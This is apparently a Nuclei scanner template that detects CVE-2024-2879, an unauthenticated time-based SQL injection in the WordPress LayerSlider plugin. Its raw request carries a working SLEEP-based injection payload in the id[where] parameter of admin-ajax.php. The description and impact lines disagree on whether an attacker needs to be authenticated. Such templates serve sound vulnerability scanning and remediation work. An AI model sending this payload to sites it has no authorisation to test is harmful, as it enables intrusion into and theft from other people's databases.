flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - .ls-clearfix:before
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/LayerSlider/assets/static/public/front.css'
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - contains(body, "<script>")
    type: dsl
  raw:
  - '@timeout: 10s

    GET /wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))x)--+x)
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-2879
info:
  author: d4ly
  classification:
    cpe: cpe:2.3:a:layerslider:layerslider:7.9.11:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-2879
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-89
    epss-percentile: 0.99787
    epss-score: 0.93243
  description: 'The LayerSlider plugin for WordPress is vulnerable to SQL Injection
    via the ls_get_popup_markup action in versions 7.9.11 and 7.10.0 due to insufficient
    escaping on the user supplied parameter and lack of sufficient preparation on
    the existing SQL query.  This makes it possible for unauthenticated attackers
    to append additional SQL queries into already existing queries that can be used
    to extract sensitive information from the database.

    '
  impact: 'Authenticated attackers can execute arbitrary SQL queries, potentially
    extracting sensitive data or compromising the database.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: layerslider
    publicwww-query: /wp-content/plugins/LayerSlider/
    vendor: layerslider
    verified: true
  name: WordPress Plugin LayerSlider 7.9.11-7.10.0 - SQL Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-2879
  - https://www.securityblue.team/blog/posts/Critical-Vulnerability-in-WordPress-Plugin-LayerSlider
  - https://www.wordfence.com/blog/2024/04/5500-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-layerslider-wordpress-plugin/
  - https://layerslider.com/release-log/
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/3fddf96e-029c-4753-ba82-043ca64b78d3?source=cve
  remediation: 'Update LayerSlider plugin to version 7.10.1 or later.

    '
  severity: high
  tags: time-based-sqli,cve,cve2024,wp-plugin,wp,wordpress,layerslider,sqli,vuln
